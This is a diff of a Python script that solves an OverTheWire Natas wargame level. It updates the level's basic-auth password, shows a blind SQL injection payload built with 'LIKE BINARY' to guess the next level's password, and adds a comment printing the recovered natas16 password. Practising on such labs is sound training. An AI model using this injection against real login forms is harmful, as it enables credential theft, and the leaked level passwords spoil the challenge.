@@ -49,10 +49,17 @@ def main():
 
 
 url = 'http://natas15.natas.labs.overthewire.org'
-lvl_pass = requests.auth.HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
+lvl_pass = requests.auth.HTTPBasicAuth('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
 un_base = 'natas16" AND password LIKE BINARY "'
 alphanum = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
 filt_chars = []
 pw_len = 0
 pw = ""
 main()
+
+'''
+Who the hell needs to be GIVEN the password?
+I'll construct that shit myself!
+Username: natas16
+Password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+'''
